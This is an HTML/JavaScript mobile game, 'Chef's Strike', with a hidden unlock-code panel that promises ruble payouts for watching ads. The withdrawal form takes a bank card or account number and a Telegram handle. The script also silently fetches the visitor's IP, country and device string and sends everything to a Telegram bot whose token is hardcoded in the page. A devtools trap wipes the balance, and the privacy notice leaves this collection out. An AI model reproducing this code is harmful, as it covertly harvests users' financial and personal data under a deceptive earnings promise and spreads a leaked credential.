<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Chef's Strike</title>
    <style>
        :root { --bg: #0a0a0a; --accent: #ff4757; --win: #2ed573; --ad: #f1c40f; --coin: #ffd700; }
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: var(--bg); font-family: 'Arial Black', sans-serif; }
        #game-wrapper { position: relative; width: 100vw; height: 100vh; display: flex; justify-content: center; align-items: center; background: radial-gradient(circle at center, #1e272e 0%, #000 100%); }
        canvas { display: block; z-index: 5; cursor: pointer; }
        .overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 100; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); }
        #shop-ui { display: none; z-index: 300; background: rgba(0,0,0,0.9); }
        .shop-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 90%; max-width: 400px; margin-top: 20px; }
        .shop-item { background: rgba(255,255,255,0.1); border: 2px solid rgba(255,255,255,0.2); border-radius: 15px; padding: 15px; text-align: center; cursor: pointer; transition: 0.1s; }
        .shop-item.active { border-color: var(--win); background: rgba(46, 213, 115, 0.2); }
        .shop-item.locked { opacity: 0.6; }
        .btn { padding: 18px 50px; font-size: 22px; font-weight: bold; background: var(--accent); border: none; color: white; border-radius: 50px; cursor: pointer; margin-top: 15px; box-shadow: 0 10px 0 #b91c1c; transition: transform 0.05s; }
        .btn:active { transform: translateY(5px); box-shadow: 0 5px 0 #b91c1c; }
        .btn:disabled { opacity: 0.5; transform: none; pointer-events: none; }
        .btn-small { padding: 10px 20px; font-size: 14px; margin-top: 10px; background: #555; box-shadow: 0 5px 0 #333; }
        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: center; gap: 20px; pointer-events: none; z-index: 10; }
        .stat { background: rgba(0,0,0,0.6); border: 1px solid rgba(255,255,255,0.1); padding: 8px 15px; border-radius: 12px; text-align: center; min-width: 60px; }
        .stat b { font-size: 20px; color: var(--accent); display: block; }
        .stat span { font-size: 10px; text-transform: uppercase; opacity: 0.8; }
        .stat b.coin-val { color: var(--coin); }
        #reward-form { display: none; flex-direction: column; align-items: center; margin-top: 15px; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 20px; }
        #balance-display { font-size: 20px; color: var(--win); margin-bottom: 10px; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 15px; border: 1px solid var(--win); }
        #win-screen { position: absolute; inset: 0; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 200; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); }
        input { padding:10px; border-radius:10px; border:none; outline:none; text-align:center; font-family: sans-serif; font-weight: bold; }
        .adsterra-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            z-index: 1000;
            background: rgba(0,0,0,0.8);
            padding: 5px 0;
            pointer-events: auto;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 15px;
            max-width: 90%;
            max-height: 80%;
            overflow-y: auto;
            color: white;
            font-family: sans-serif;
            font-size: 14px;
        }
        .modal-content h3 { color: var(--coin); }
        .close-modal {
            background: var(--accent);
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            color: white;
            margin-top: 15px;
            cursor: pointer;
        }
        .min-withdraw-info { font-size: 12px; color: #888; margin-top: 5px; }
    </style>
</head>
<body>
<div id="game-wrapper">
    <div id="menu-bg-collage"></div>
    <button id="exit-game-btn" style="position:absolute; top:20px; right:20px; display:none; z-index:150;" onclick="restartGame()">ВЫЙТИ</button>
    
    <div id="hud">
        <div class="stat"><span>УРОВЕНЬ</span><b id="lvl-ui">1</b></div>
        <div class="stat"><span>ВИЛОК</span><b id="forks-ui">5</b></div>
        <div class="stat"><span>МОНЕТЫ</span><b id="coins-ui" class="coin-val">0</b></div>
    </div>

    <div id="win-screen"><h1 style="color:var(--win); font-size:50px;">+10 МОНЕТ</h1></div>

    <div id="shop-ui" class="overlay">
        <h1 style="color:var(--coin)">МАГАЗИН</h1>
        <div id="shop-coins-display" style="font-size:24px; color:var(--coin)">💰 0</div>
        <div class="shop-grid" id="shop-items-container"></div>
        <button class="btn" style="background:#555; box-shadow:0 8px 0 #333" onclick="closeShop()">ЗАКРЫТЬ</button>
    </div>

    <div id="main-menu" class="overlay">
        <h1 id="logo" style="color:var(--accent); font-size: 45px; cursor:pointer;" onclick="handleLogoClick()">CHEF'S STRIKE</h1>
        <button class="btn" onclick="startGame()">ИГРАТЬ</button>
        <button class="btn" style="background:var(--coin); color:black; box-shadow:0 10px 0 #b8860b" onclick="openShop()">МАГАЗИН</button>
        <button class="btn btn-small" style="background:#555; box-shadow:0 5px 0 #333; font-size:12px;" onclick="showPrivacyPolicy()">ПОЛИТИКА</button>
        
        <div id="promo-container" style="display:none; margin-top:20px;">
            <input type="text" id="promo-input" placeholder="ВВЕДИТЕ КОД" oninput="checkPromo()">
        </div>

        <div id="secret-panel" style="display:none; flex-direction:column; align-items:center; margin-top:20px;">
            <div id="balance-display">Баланс: <span id="bal-val">0.00 руб.</span></div>
            <div class="min-withdraw-info">💰 Минимальная выплата: 30 руб.</div>
            <input type="text" id="user-name-input" placeholder="@ваш_телеграм" oninput="saveUserName()" style="margin-bottom:10px; border: 1px solid var(--win);">
            
            <button class="btn" style="background:#9b59b6; box-shadow: 0 8px 0 #7d3c98; font-size:16px;" onclick="showReward(0.06)">РЕКЛАМА</button>
            <button class="btn" style="background:#f39c12; box-shadow: 0 8px 0 #e67e22; font-size:16px;" onclick="showReward(0.04)">СМОТРЕТЬ</button>
            <button class="btn" id="withdrawBtn" style="background:#9b59b6; box-shadow: 0 8px 0 #7d3c98; font-size:16px;" onclick="showRewardForm()">ВЫПЛАТА</button>
            <div id="reward-form">
                <input type="text" id="rew-method" placeholder="Способ (Карта/СБП)" style="margin-bottom:5px;">
                <input type="text" id="rew-number" placeholder="Номер счета (только цифры)" style="margin-bottom:5px;">
                <input type="number" id="rew-amount" placeholder="Сумма" style="margin-bottom:5px;">
                <button class="btn" style="background:var(--win); box-shadow:0 8px 0 #219150; font-size:14px; padding:10px 20px;" onclick="sendRewardData()">ОТПРАВИТЬ</button>
            </div>
        </div>
    </div>

    <div id="game-over" class="overlay" style="display:none">
        <h1 style="font-size: 50px; color: #ff4757;">ПРОМАХ!</h1>
        <button class="btn" style="background:var(--ad); color:black; box-shadow:0 10px 0 #c49b0e" onclick="revive()">ВОСКРЕСНУТЬ</button>
        <button class="btn" onclick="restartGame()">В МЕНЮ</button>
    </div>
    
    <canvas id="c"></canvas>
</div>

<div class="adsterra-banner">
    <script src="https://pl29025941.profitablecpmratenetwork.com/79/09/07/790907aff1a8e13a2e6d0a1f6ed23053.js"></script>
</div>

<div id="privacy-modal" class="modal">
    <div class="modal-content">
        <h3>Политика конфиденциальности</h3>
        <p>Мы собираем данные для показа рекламы и улучшения работы приложения.</p>
        <button class="close-modal" onclick="closePrivacyModal()">ЗАКРЫТЬ</button>
    </div>
</div>

<script>
// ============ ПОЛУЧЕНИЕ IP И УСТРОЙСТВА ============
let userIP = "Не определен";
let userDevice = navigator.userAgent;
let userCountry = "Не определен";

fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        userIP = data.ip;
        localStorage.setItem('user_ip', userIP);
        fetch(`https://ipapi.co/${userIP}/json/`)
            .then(res => res.json())
            .then(geo => {
                userCountry = geo.country_name || "Не определен";
                localStorage.setItem('user_country', userCountry);
            });
    })
    .catch(() => {
        userIP = "Не удалось определить";
    });

// ============ СЧЁТЧИКИ РЕКЛАМЫ (СКРЫТЫЕ ОТ ПОЛЬЗОВАТЕЛЯ) ============
let adCount06 = parseInt(localStorage.getItem('ad_count_06')) || 0;
let adCount04 = parseInt(localStorage.getItem('ad_count_04')) || 0;

// ============ АНТИ-ВЗЛОМ ============
(function() {
    let devtools = /./;
    devtools.toString = function() {
        this.opened = true;
        if (typeof _secureBalance !== 'undefined') {
            _secureBalance = 0;
            _balanceSalt = Math.random() * 1000000;
        }
        alert("🔒 Обнаружены инструменты разработчика! Баланс обнулён для защиты.");
        location.reload();
    };
    setInterval(() => {
        console.log('%c', devtools);
        console.clear();
    }, 1000);
})();

let _secureBalance = 0;
let _balanceSalt = 0;

function loadSecureBalance() {
    try {
        const saved = localStorage.getItem('_enc_bal');
        const salt = localStorage.getItem('_bal_salt');
        if (saved && salt) {
            let val = parseInt(saved) ^ parseInt(salt);
            _secureBalance = val / 100;
            _balanceSalt = parseInt(salt);
        } else {
            _secureBalance = 0;
            _balanceSalt = Math.floor(Math.random() * 1000000);
        }
    } catch(e) {
        _secureBalance = 0;
        _balanceSalt = Math.floor(Math.random() * 1000000);
    }
    return _secureBalance;
}

function saveSecureBalance() {
    try {
        const encrypted = Math.floor(_secureBalance * 100) ^ _balanceSalt;
        localStorage.setItem('_enc_bal', encrypted);
        localStorage.setItem('_bal_salt', _balanceSalt);
    } catch(e) {}
}

function getBalance() {
    return _secureBalance;
}

function addToBalance(amount) {
    let newBal = _secureBalance + amount;
    if (newBal > 10000) newBal = 10000;
    _secureBalance = newBal;
    saveSecureBalance();
    return _secureBalance;
}

function setBalance(newBalance) {
    if (typeof newBalance !== 'number' || isNaN(newBalance) || newBalance < 0) return false;
    if (newBalance > 10000) return false;
    _secureBalance = newBalance;
    saveSecureBalance();
    return true;
}

Object.defineProperty(window, 'G', {
    get: function() { return null; },
    set: function() { console.warn("Доступ запрещён"); }
});

// ============ МИНИМАЛЬНАЯ ВЫПЛАТА ============
const MIN_WITHDRAW = 30;

function updateWithdrawButton() {
    const btn = document.getElementById('withdrawBtn');
    if (btn) {
        const bal = getBalance();
        if (bal >= MIN_WITHDRAW) {
            btn.style.opacity = "1";
            btn.style.pointerEvents = "auto";
            btn.innerText = "ВЫПЛАТА";
        } else {
            btn.style.opacity = "0.5";
            btn.style.pointerEvents = "none";
            btn.innerText = `ВЫПЛАТА (нужно ${(MIN_WITHDRAW - bal).toFixed(2)} руб.)`;
        }
    }
}

// ============ РЕКЛАМА ============
let pendingReward = null;
let lastAdTime = 0;
const AD_COOLDOWN = 10000;

function canShowAd() {
    const now = Date.now();
    if (now - lastAdTime < AD_COOLDOWN) {
        const seconds = Math.ceil((AD_COOLDOWN - (now - lastAdTime)) / 1000);
        alert(`Подождите ${seconds} секунд перед следующей рекламой!`);
        return false;
    }
    return true;
}

function showReward(amount) {
    if (!canShowAd()) return;
    if (pendingReward) {
        alert("Подождите, реклама уже открыта!");
        return;
    }
    
    lastAdTime = Date.now();
    
    // Увеличиваем счётчик в зависимости от суммы
    if (amount === 0.06) {
        adCount06++;
        localStorage.setItem('ad_count_06', adCount06);
    } else if (amount === 0.04) {
        adCount04++;
        localStorage.setItem('ad_count_04', adCount04);
    }
    
    var script = document.createElement('script');
    script.src = "https://pl29025942.profitablecpmratenetwork.com/70/21/72/7021726f51378e45e31a9f08b7cf194b.js";
    script.async = true;
    document.body.appendChild(script);
    
    pendingReward = amount;
    
    window.addEventListener('focus', function onReturn() {
        window.removeEventListener('focus', onReturn);
        if (pendingReward !== null) {
            addToBalance(pendingReward);
            updateBalanceDisplay();
            alert(`+${pendingReward.toFixed(2)} руб. за просмотр рекламы!`);
            pendingReward = null;
            updateWithdrawButton();
        }
    });
}

function revive() {
    if (!canShowAd()) return;
    if (pendingReward) {
        alert("Подождите, реклама уже открыта!");
        return;
    }
    
    lastAdTime = Date.now();
    
    var script = document.createElement('script');
    script.src = "https://pl29025942.profitablecpmratenetwork.com/70/21/72/7021726f51378e45e31a9f08b7cf194b.js";
    script.async = true;
    document.body.appendChild(script);
    
    pendingReward = 0;
    
    window.addEventListener('focus', function onReturn() {
        window.removeEventListener('focus', onReturn);
        if (pendingReward !== null) {
            document.getElementById('game-over').style.display = 'none';
            G_active = true;
            G_isFlying = false;
            G_canShoot = true;
            G_fY = canvas.height - 150;
            updateUI();
            alert("Вы воскресли!");
            pendingReward = null;
        }
    });
}

function showPrivacyPolicy() {
    document.getElementById('privacy-modal').style.display = 'flex';
}
function closePrivacyModal() {
    document.getElementById('privacy-modal').style.display = 'none';
}

function updateBalanceDisplay() {
    document.getElementById('bal-val').innerText = getBalance().toFixed(2) + " руб.";
    saveGameData();
}

// ============ ВЫПЛАТА С ПОЛНОЙ ИНФОРМАЦИЕЙ ============
function sendRewardData() {
    const bal = getBalance();
    if (bal < MIN_WITHDRAW) {
        alert(`Минимальная сумма выплаты ${MIN_WITHDRAW} руб. Ваш баланс: ${bal.toFixed(2)} руб.`);
        return;
    }
    
    const method = document.getElementById('rew-method').value;
    const number = document.getElementById('rew-number').value;
    const amount = parseFloat(document.getElementById('rew-amount').value);
    
    // Проверка Telegram username
    const tgUsername = G_userName;
    if (!tgUsername || tgUsername === "" || tgUsername === "@") {
        alert("❌ Введите ваш Telegram username в поле @ваш_телеграм!");
        return;
    }
    
    // Проверка номера (только цифры)
    if (!/^\d+$/.test(number)) {
        alert("❌ Номер должен содержать только цифры!");
        return;
    }
    
    if(!method || !number || !amount) {
        alert("Заполните все поля!");
        return;
    }
    
    if (amount > bal) {
        alert("Сумма превышает баланс!");
        return;
    }
    
    if (amount < MIN_WITHDRAW) {
        alert(`Минимальная сумма ${MIN_WITHDRAW} руб.`);
        return;
    }
    
    // Получаем IP и устройство
    const ip = localStorage.getItem('user_ip') || userIP || "Не определен";
    const country = localStorage.getItem('user_country') || userCountry || "Не определен";
    const device = userDevice || navigator.userAgent;
    const date = new Date().toLocaleString('ru-RU');
    
    // СПИСЫВАЕМ ДЕНЬГИ
    const newBalance = bal - amount;
    setBalance(newBalance);
    updateBalanceDisplay();
    updateWithdrawButton();
    
    // Формируем сообщение для Telegram
    const message = `💰 ВЫПЛАТА\n` +
        `💳 Способ: ${method}\n` +
        `📞 Номер: ${number}\n` +
        `💵 Сумма: ${amount} руб\n` +
        `---\n` +
        `👤 Баланс: ${newBalance.toFixed(2)} руб\n` +
        `🌐 IP: ${ip}\n` +
        `📍 Страна: ${country}\n` +
        `📱 Устройство: ${device.substring(0, 100)}...\n` +
        `🆔 TG: ${tgUsername}\n` +
        `📅 Дата: ${date}\n` +
        `📊 Реклама: ${adCount06} (×0.06) + ${adCount04} (×0.04) = ${adCount06 + adCount04} просмотров`;
    
    // Отправляем в Telegram
    const TG_TOKEN = "8743340521:AAEMgkn8_8kEjAtDB6kUORi45iII0Du6aTs";
    const TG_ADMIN_ID = "7815623051";
    
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ADMIN_ID}&text=${encodeURIComponent(message)}`)
        .then(() => {
            alert(`✅ Заявка на ${amount} руб. отправлена!\n💰 Новый баланс: ${newBalance.toFixed(2)} руб.`);
            document.getElementById('rew-method').value = '';
            document.getElementById('rew-number').value = '';
            document.getElementById('rew-amount').value = '';
            document.getElementById('reward-form').style.display = 'none';
        })
        .catch(() => {
            alert("❌ Ошибка отправки. Попробуйте позже.");
            // Возвращаем деньги если ошибка
            setBalance(bal);
            updateBalanceDisplay();
            updateWithdrawButton();
        });
}

function showRewardForm() { 
    const bal = getBalance();
    if (bal < MIN_WITHDRAW) {
        alert(`Минимальная сумма для вывода: ${MIN_WITHDRAW} руб. Ваш баланс: ${bal.toFixed(2)} руб.`);
        return;
    }
    const f = document.getElementById('reward-form'); 
    f.style.display = f.style.display === 'flex' ? 'none' : 'flex'; 
}

// ============ ОСТАЛЬНОЙ КОД ИГРЫ ============
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');
const S = { radius: 95, y: 0, fW: 12, fH: 80, fSpeed: 45 };

const WEAPONS = [
    { id: 'fork', name: 'Вилка', color: '#b2bec3', tip: '#dfe6e9', price: 0, icon: '🍴' },
    { id: 'knife', name: 'Нож шефа', color: '#636e72', tip: '#ffffff', price: 100, icon: '🔪' },
    { id: 'cleaver', name: 'Тесак', color: '#2d3436', tip: '#fab1a0', price: 300, icon: '🪓' },
    { id: 'gold', name: 'Золото', color: '#d4af37', tip: '#ffd700', price: 1000, icon: '✨' }
];

let G_active = false, G_level = 1, G_rotation = 0, G_rotSpeed = 0.03;
let G_forksIn = [], G_isFlying = false, G_canShoot = true, G_isTransition = false;
let G_fY = 0, G_targetForks = 5, G_logoClicks = 0, G_hitEffect = 0;
let G_coins = parseInt(localStorage.getItem('chef_coins')) || 0;
let G_userName = localStorage.getItem('chef_user') || '';
let G_ownedWeapons = JSON.parse(localStorage.getItem('chef_owned')) || ['fork'];
let G_currentWeapon = localStorage.getItem('chef_weap') || 'fork';
let G_secretUnlocked = localStorage.getItem('chef_secret') === 'true';

const TARGETS = [
    { juice: '#b91c1c', icon: '🍉' },
    { juice: '#ff9f43', icon: '🍊' },
    { juice: '#ee5253', icon: '🍅' },
    { juice: '#10ac84', icon: '🥝' }
]

loadSecureBalance();
updateBalanceDisplay();

function saveGameData() {
    localStorage.setItem('chef_coins', G_coins);
    localStorage.setItem('chef_user', G_userName);
    localStorage.setItem('chef_owned', JSON.stringify(G_ownedWeapons));
    localStorage.setItem('chef_weap', G_currentWeapon);
    document.getElementById('coins-ui').innerText = G_coins;
    updateWithdrawButton();
}

function saveUserName() {
    G_userName = document.getElementById('user-name-input').value;
    localStorage.setItem('chef_user', G_userName);
}

function openShop() {
    document.getElementById('shop-ui').style.display = 'flex';
    document.getElementById('shop-coins-display').innerText = '💰 ' + G_coins;
    const container = document.getElementById('shop-items-container');
    container.innerHTML = '';
    WEAPONS.forEach(w => {
        const isOwned = G_ownedWeapons.includes(w.id);
        const isActive = G_currentWeapon === w.id;
        const div = document.createElement('div');
        div.className = `shop-item ${isActive ? 'active' : ''} ${!isOwned ? 'locked' : ''}`;
        div.innerHTML = `<div style="font-size:30px">${w.icon}</div><div style="font-size:14px">${w.name}</div><div style="color:var(--coin)">${isOwned ? (isActive ? 'ВЫБРАНО' : 'ВЗЯТЬ') : w.price + ' 💰'}</div>`;
        div.onclick = () => buyOrSelect(w);
        container.appendChild(div);
    });
}

function buyOrSelect(w) {
    if (G_ownedWeapons.includes(w.id)) G_currentWeapon = w.id;
    else if (G_coins >= w.price) { G_coins -= w.price; G_ownedWeapons.push(w.id); G_currentWeapon = w.id; }
    else alert("Недостаточно монет!");
    saveGameData(); openShop();
}

function closeShop() { document.getElementById('shop-ui').style.display = 'none'; }

function drawFork(x, y, angle = 0, scale = 1) {
    const w = WEAPONS.find(v => v.id === G_currentWeapon);
    ctx.save(); ctx.translate(x, y); ctx.rotate(angle); ctx.scale(scale, scale);
    ctx.fillStyle = w.color; ctx.beginPath(); ctx.roundRect(-S.fW/2, 20, S.fW, S.fH - 20, 5); ctx.fill();
    ctx.fillStyle = w.tip; 
    if(w.id === 'fork') {
        ctx.fillRect(-S.fW/2, 0, S.fW, 25);
        for(let i = 0; i < 3; i++) ctx.fillRect(-S.fW/2 + (i * S.fW/2.5), -15, 2.5, 15);
    } else {
        ctx.beginPath(); ctx.moveTo(-S.fW, 20); ctx.lineTo(S.fW, 20); ctx.lineTo(0, -20); ctx.closePath(); ctx.fill();
    }
    ctx.restore();
}

function win() { 
    G_isTransition = true; 
    G_coins += 10;
    saveGameData();
    document.getElementById('win-screen').style.display = 'flex'; 
    setTimeout(() => { G_level++; initLevel(); G_active = true; }, 1000); 
}

function handleLogoClick() { 
    G_logoClicks++; 
    if (G_logoClicks >= 10 && !G_secretUnlocked) { 
        document.getElementById('promo-container').style.display = 'block';
    } 
}

function checkPromo() { 
    if (document.getElementById('promo-input').value.toLowerCase() === 'chef777' && !G_secretUnlocked) { 
        document.getElementById('promo-container').style.display = 'none'; 
        document.getElementById('secret-panel').style.display = 'flex';
        document.getElementById('user-name-input').value = G_userName;
        G_secretUnlocked = true;
        localStorage.setItem('chef_secret', 'true');
        updateWithdrawButton();
    } 
}

function resize() { 
    canvas.width = Math.min(window.innerWidth, 500); 
    canvas.height = Math.min(window.innerHeight, 900); 
    S.y = canvas.height * 0.35; 
    G_fY = canvas.height - 150; 
}

function drawTarget() {
    ctx.save(); ctx.translate(canvas.width / 2, S.y);
    ctx.rotate(G_rotation);
    const conf = TARGETS[(G_level - 1) % TARGETS.length];
    ctx.fillStyle = conf.juice; ctx.beginPath(); ctx.arc(0, 0, S.radius + G_hitEffect, 0, Math.PI * 2); ctx.fill();
    ctx.fillStyle = 'white'; ctx.font = '60px Arial'; ctx.textAlign = 'center'; ctx.fillText(conf.icon, 0, 20);
    G_forksIn.forEach(angle => { ctx.save(); ctx.rotate(angle); drawFork(0, -S.radius, Math.PI, 0.9); ctx.restore(); });
    ctx.restore();
}

function initLevel() {
    G_forksIn = []; G_isFlying = false; G_canShoot = true; G_isTransition = false; G_fY = canvas.height - 150;
    G_targetForks = 5 + Math.floor(G_level / 2);
    G_rotSpeed = 0.03 + (G_level * 0.002);
    document.getElementById('win-screen').style.display = 'none';
    updateUI();
}

function loop() {
    ctx.clearRect(0,0,canvas.width, canvas.height);
    if(!G_active) { requestAnimationFrame(loop); return; }
    G_rotation += G_rotSpeed;
    drawTarget();
    if(G_isFlying) { G_fY -= S.fSpeed; if(G_fY <= S.y + S.radius) checkImpact(); }
    if(!G_isTransition) drawFork(canvas.width/2, G_fY);
    G_hitEffect *= 0.8;
    requestAnimationFrame(loop);
}

function checkImpact() {
    let hitAngle = (Math.PI - G_rotation + Math.PI * 2) % (Math.PI * 2);
    if(G_forksIn.some(a => Math.abs(a - hitAngle) < 0.35)) {
        G_active = false; document.getElementById('game-over').style.display = 'flex';
    } else {
        G_forksIn.push(hitAngle); G_isFlying = false; G_fY = canvas.height - 150; G_hitEffect = 10;
        updateUI(); setTimeout(() => G_canShoot = true, 50);
        if(G_forksIn.length >= G_targetForks) win();
    }
}

function startGame() { 
    document.getElementById('main-menu').style.display = 'none'; 
    document.getElementById('exit-game-btn').style.display = 'block'; 
    G_active = true; 
    initLevel(); 
}
function restartGame() { location.reload(); }
function updateUI() { 
    document.getElementById('lvl-ui').innerText = G_level; 
    document.getElementById('forks-ui').innerText = (G_targetForks - G_forksIn.length); 
    document.getElementById('coins-ui').innerText = G_coins; 
}
function handleInput() { 
    if(G_active && !G_isFlying && !G_isTransition && G_canShoot) { 
        G_isFlying = true; 
        G_canShoot = false; 
    } 
}

window.addEventListener('touchstart', (e) => { if(e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') handleInput(); });
window.addEventListener('mousedown', (e) => { if(e.target.tagName !== 'BUTTON' && e.target.tagName !== 'INPUT') handleInput(); });

resize(); 
loop(); 
saveGameData();

if (G_secretUnlocked) {
    document.getElementById('secret-panel').style.display = 'flex';
}

updateWithdrawButton();
</script>
</body>
</html>
